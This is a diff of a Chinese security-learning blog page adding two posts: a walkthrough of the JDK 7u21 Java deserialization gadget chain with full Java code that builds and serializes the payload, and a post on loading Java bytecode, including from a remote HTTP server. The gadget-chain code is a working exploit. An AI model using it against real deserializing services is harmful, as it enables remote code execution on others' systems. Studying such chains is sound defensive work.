@@ -188,6 +188,230 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/24/7u21/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/24/7u21/" class="post-title-link" itemprop="url">7u21</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-24 11:18:48" itemprop="dateCreated datePublished" datetime="2022-03-24T11:18:48+08:00">2022-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-25 13:50:28" itemprop="dateModified" datetime="2022-03-25T13:50:28+08:00">2022-03-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>首先去下载个jdk7u21</p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p>
+<p>然后去下载对应版本的openjdk</p>
+<p>参照这篇文章进行操作<a target="_blank" rel="noopener" href="https://www.cnblogs.com/haimishasha/p/9909055.html">https://www.cnblogs.com/haimishasha/p/9909055.html</a></p>
+<p>注:以下所有提到<code>templates</code>对象的地方,<code>templates</code>都指的是实例化<code>TemplatesImpl</code>并构造好的恶意类</p>
+<h4 id="类分析"><a href="#类分析" class="headerlink" title="类分析"></a>类分析</h4><p><code>AnnotationInvocationHandler</code>这个类中有一个<code>equalsImpl</code>方法</p>
+<p>它可以调用通过反射调用所有通过<code>getMemberMethods</code>获取到的Method数组中的method</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220324112303655.png" alt="image-20220324112303655"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">            String member = memberMethod.getName();</span><br><span class="line">            Object ourValue = memberValues.get(member);</span><br><span class="line">            Object hisValue = <span class="keyword">null</span>;</span><br><span class="line">            AnnotationInvocationHandler hisHandler = asOneOfUs(o);</span><br><span class="line">            <span class="keyword">if</span> (hisHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">                hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    hisValue = memberMethod.invoke(o);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说， <code>equalsImpl</code> 这个方法是将 <code>this.type</code> 类中的所有方法遍历并执行了。那么，假设<code>this.type</code>是<code>TemplatesImpl</code>类，则势必会调用到其中的 <code>newTransformer() </code>或<code>getOutputProperties()</code>方法，进而触发任意代码执行。</p>
+<h4 id="如何调用equalsImpl"><a href="#如何调用equalsImpl" class="headerlink" title="如何调用equalsImpl"></a>如何调用equalsImpl</h4><p>接下来找调用了<code>equalsImpl</code>方法的地方,因为其是private,所以一般都在本类中调用</p>
+<p>在本类中的invoke方法中找到了<code>equalsImpl</code>的调用</p>
+<p>这里就又涉及到了动态代理的问题</p>
+<p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>接口,所以它只需要代理对应的类,然后调用类中的任意方法都会执行invoke方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">        String member = method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;hashCode&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;annotationType&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        Object result = memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当调用的方法名为<code>equals</code>的时候,会调用<code>equalsImpl</code>方法</p>
+<p>找<code>equals</code>方法调用链</p>
+<p>比较Java对象的时候,常用的两个方法</p>
+<ul>
+<li>equals</li>
+<li>compareTo</li>
+</ul>
+<p>任意java兑现都有<code>equals</code>方法,它通常用于比较两个对象是否是同一个引用,<code>而compareTo</code>实际上是<code>java.lang.Compareable</code>接口的方法,<code>java.util.PriorityQueue</code>中也用到过,通常被实现用于比较两个对象的值是否相等.</p>
+<p>一个常见的会调用equals的场景是集合Set,Set中存储的对象不允许重复,所以在添加对象的时候,势必会涉及到比较操作.</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220324175504230.png" alt="image-20220324175504230"></p>
+<p>可以把i暂且看为hashCode的单射函数,i就是对象在hash表中应该跟在哪个位置后面,当两个对象跟在同一个后面的时候,就会调用equals再次进行比较,接下来就是要让proxy对象的”i”等于templates的”i”</p>
+<p>跟着P牛的逻辑</p>
+<p>计算“哈希”的主要是下面这两行代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> hash = hash(key);</span><br><span class="line"><span class="keyword">int</span> i = indexFor(hash, table.length);</span><br></pre></td></tr></table></figure>
+
+<p>将其中的关键逻辑提权出来，可以得到下面这个函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">	h ^= key.hashCode();</span><br><span class="line">	h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">	h = h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> h &amp; <span class="number">15</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除了<code>key.hashCode</code>外没有其他变量,所以proxy对象与<code>TemplateImpl</code>对象的”i”是否相等,仅仅取决于这两个对象的<code>hashCode</code>是否相等,TemplateImpl的<code>hashCode</code>是一个Native方法,每次运行都会发生变化,理论上是无法预测的,所以想让proxy的<code>hashCode</code>与之相等,只能寄希望于<code>proxy.hashCode</code></p>
+<p><code>proxy.hashCode()</code> 仍然会调用到<code> AnnotationInvocationHandler#invoke</code> ，进而调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code> ，这个方法代码如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">            result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">                memberValueHashCode(e.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码在看过p牛的解析后恍然大悟,果然是基础不牢,地动山摇,</p>
+<p>最核心的一点就是很基础的<code>0异或任何数都等于该数本身</code></p>
+<p>所以这个地方只需要保证<code>e.getKey().hashCode()</code>为0,那么就可以控制result为<code>memberValueHashCode(e.getValue())</code></p>
+<p><code>f5a5a608</code>字符串的HashCode为0,那么就可以作为map的key放进去,从而让<code>hashCodeImpl()</code>返回的值为<code>templates</code>的hashCode,这样在后面就会触发equals方法,</p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\unser\\7u21\\target\\test-classes\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Class&lt;Templates&gt; templatesClass1 = Templates.class;</span><br><span class="line">        <span class="comment">//为templates创建代理实例proxy,调用proxy的任意方法都会调用到AnnotationInvocationHandler里面的invoke方法</span></span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)declaredConstructor.newInstance(Templates.class, map);</span><br><span class="line">        Object proxy= Proxy.newProxyInstance(test.class.getClassLoader(), templatesClass.getInterfaces(), handler);</span><br><span class="line">        HashSet hashSet = <span class="keyword">new</span> HashSet();</span><br><span class="line">        hashSet.add(templates);</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line">        map.put(zeroHashCodeStr,templates);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(path));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h3><p>HashSet.readObject()—–&gt;新建一个hash链表,接着开始计算hash, proxy由于代理了<code>AnnotationInvocationHandler</code>所以调用<code>hashCode</code>会在<code>invoke</code>中走到<code>hashCodeImpl</code>方法然后这个地方的<code>memberValues</code>是之前的精心构造的map,它的key的hash结果是0,所以会返回<code>Templates</code>的hash结果,</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">            result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">                memberValueHashCode(e.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是proxy返回的hashCode和<code>Templates</code>的结果一样了,由于HashSet的特性,会调用<code>equals</code>方法,而proxy中调用<code>equals</code>方法会传入参数为<code>templates</code>作为调用到<code>equalsImpl</code>方法时<code>o</code>的值</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220325131726788.png" alt="image-20220325131726788"></p>
+<p>该方法遍历并执行type中的所有方法,而type是<code>TemplatesImpl</code>的接口,它其中只包括了危险的<code>newTransformer</code>和<code>getOutputProperties</code>,而此时<code>o</code>是实例化好的templates,触发恶意代码执行,这块是CC2的知识</p>
+<p>P牛的文章讲的真不错,静下心来看完收获不小呢</p>
+<h5 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h5><p>画一个思维导图再加深一下理解</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220325134238553.png" alt="image-20220325134238553"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" class="post-title-link" itemprop="url">java动态加载字节码</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-23 21:31:52 / 修改时间：22:47:51" itemprop="dateCreated datePublished" datetime="2022-03-23T21:31:52+08:00">2022-03-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="什么是java的”字节码”"><a href="#什么是java的”字节码”" class="headerlink" title="什么是java的”字节码”"></a>什么是java的”字节码”</h3><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。 </p>
+<p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这 些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台 的JVM虚拟机中。</p>
+<p> 甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文 件，都可以在JVM虚拟机中运行：</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220323213706173.png" alt="image-20220323213706173"></p>
+<p>通常所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加 载的字节序列</p>
+<h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><p><code>URLClassLoader </code>实际上是我们平时默认使用的 <code>AppClassLoader </code>的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p>
+<p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况： </p>
+<ul>
+<li><p>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件 </p>
+</li>
+<li><p>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件 </p>
+</li>
+<li><p>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 </p>
+</li>
+</ul>
+<p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。</p>
+<p>使用python搭建一个简易Http服务器,将class文件放在服务器上面,尝试加载</p>
+<p><code>python3 -m http.server 5555</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        URLClassLoader urlClassLoader=<span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://xxxxxxxxxxx:5555/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; test = urlClassLoader.loadClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        test.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以，作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了。</p>
+<h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><p>其实,不管是远程加载class文件还是本地的class或者Jar文件,经历的欧式下面这三个方法的调用</p>
+<p><code>loadClass</code>—&gt;<code>findClass</code>—&gt;<code>defineClass</code></p>
+<ul>
+<li><p>其中： loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 </p>
+</li>
+<li><p>findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass </p>
+</li>
+<li><p>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</p>
+</li>
+</ul>
+<p>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass</code> 是一个native方法，逻辑在JVM的C语言代码中。\</p>
+<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。</p>
+<p>在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我 们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
+<h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为 被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的 原生库中。</p>
+<p>我们可以通过BCEL提供的两个类<code> Repository</code> 和<code>Utility</code>来利用： <code>Repository </code>用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将 原生的字节码转换成BCEL格式的字节码：</p>
+<p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的<code> TemplatesImpl</code> 都出自于同一个第三方库，Apache Xalan。但是由于各种原因，在Java 8u251的更新中，这个ClassLoader被移除了.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/shiro/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1303,255 +1527,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/01/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84-%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/01/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84-%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">java安全-反射-学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-01 22:03:55" itemprop="dateCreated datePublished" datetime="2022-03-01T22:03:55+08:00">2022-03-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-07 14:31:37" itemprop="dateModified" datetime="2022-03-07T14:31:37+08:00">2022-03-07</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">java安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
